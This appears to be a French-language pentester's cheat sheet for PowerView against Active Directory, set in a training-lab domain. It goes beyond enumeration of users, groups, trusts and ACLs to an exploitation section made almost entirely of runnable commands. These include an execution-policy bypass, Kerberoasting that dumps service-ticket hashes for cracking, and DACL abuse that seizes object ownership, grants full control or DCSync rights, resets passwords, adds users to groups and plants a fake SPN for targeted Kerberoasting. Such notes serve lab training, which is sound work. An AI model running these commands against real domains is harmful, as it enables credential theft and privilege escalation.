
> [!TIP]
> Enumération de l'AD
> https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1



```
Set-ExecutionPolicy Bypass -scope process
```

1. Importer module

```
import-module ./powerview.ps1
```


# 1. Enumération basique
#### Informations sur un user

```powershell
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

Identifier tous les groupes

```
Get-DomainGroup -Identity * | Select name
```

Membres du groupe Admins du domaine

```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

Identifier les computers

```powershell
Get-DomainComputer -Identity * | Select name
```

Relations de confiance

```powershell
Get-DomainTrustMapping
```

Tester si user actuel est admin de la machine cible

```powershell
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

Récupérer les users avec SPN (Kerberoasting)

```powershell
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```


# 2. Enumérer les users à privilèges


Identifier les users pouvant RDP sur une machine

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

Identifier les users pouvant PSRemote (WinRM) sur une machine

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```



# 3. ACLs (Access Control List)


Identifier toutes les ACL pour un user/group (LONG)

```powershell
$sid = Convert-NameToSid <user/group>
Get-DomainObjectACL -Identity * -ResolveGUIDs -Domain domain.local -Server 10.10.11.89 | ? {$_.SecurityIdentifier -eq $sid}
```

Identifier les ACL sur un objet pour un user/group

```powershell
$sid = Convert-NameToSid <user/group>
Get-DomainObjectACL -Identity <objet> -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
```



> [!TIP]
> l'option -ResolveGUIDS recupère la valeur ObjectAceType: 00299570-246d-11d0-a768-00aa006e0529 et reverse search avec ceci 
> 
> ```
> $guid= "00299570-246d-11d0-a768-00aa006e0529"
> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
> ```
> 
> 

Faire une liste de user et boucle foreach pour identifier les users sur lesquels on a des droits d'accès

```powershell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

```powershell
foreach($line in [System.IO.File]::ReadLines("ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\<useractuel>'}}
```

Identifier toutes les ACL sur le user retourné

```powershell
$sid = Convert-NameToSid <user>
Get-DomainObjectACL -Identity * -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
```



# 4. Trust Relationships


Enumérer les relations d'approbation

```powershell
Get-DomainTrust 
```

```powershell
Get-DomainTrustMapping
```

Identifier les users d'un autre domaine si possible

```powershell
 Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```



---

# 4. EXPLOITATION


## 1. KERBEROASTING

Récupérer les users avec SPN et afficher le type de chiffrement utilisé -> https://techcommunity.microsoft.com/blog/coreinfrastructureandsecurityblog/decrypting-the-selection-of-supported-kerberos-encryption-types/1628797

```powershell
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName,msds-supportedencryptiontypes
```

X-Forest

```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```

Requête d'un TGS sur user spécifique au format hashcat

```powershell-session
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

Requête d'un TGS sur tous les user vulnérables au format hashcat et export en CSV

```powershell-session
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```




## 3. DACL Abuse

- `ForceChangePassword` abused with `Set-DomainUserPassword`
- `Add Members` abused with `Add-DomainGroupMember`
- `GenericAll` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `GenericWrite` abused with `Set-DomainObject`
- `WriteOwner` abused with `Set-DomainObjectOwner`
- `WriteDACL` abused with `Add-DomainObjectACL`
- `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `Addself` abused with `Add-DomainGroupMember`


### 1. S'authentifier avec le compte ayant les droits

```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```


### 2. WriteOwner

Changer le propriétaire de l'objet

```Powershell
Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal' -Credential $Cred -Verbose
```


### 3. WriteDACL

Attribuer les droits fullcontrol / DCSync sur la target

```powershell
Add-DomainObjectAcl -Rights 'All' -TargetIdentity "target_object" -PrincipalIdentity "controlled_object" -Credential $Cred -Verbose
```


### 4. ForceChangePassword

Attribuer le nouveau mot de passe à la target (doit être connecté en tant que le user ayant les droits)

```powershell
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```


### 5. AddMember (AddSelf)

Ajouter le user au groupe

```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred -Verbose
```

Confirmer l'ajout du user

```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```


### 6. GenericWrite

#### TargetedKerberoast

1. Vérifier que la target n'a pas de SPN

```powershell
Get-DomainUser 'adunn' | Select serviceprincipalname
```

2. Ajouter le SPN au user

```powershell
Set-DomainObject -Credential $Cred -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

3. Kerberoasting -> [[POWERVIEW#1. KERBEROASTING]] 







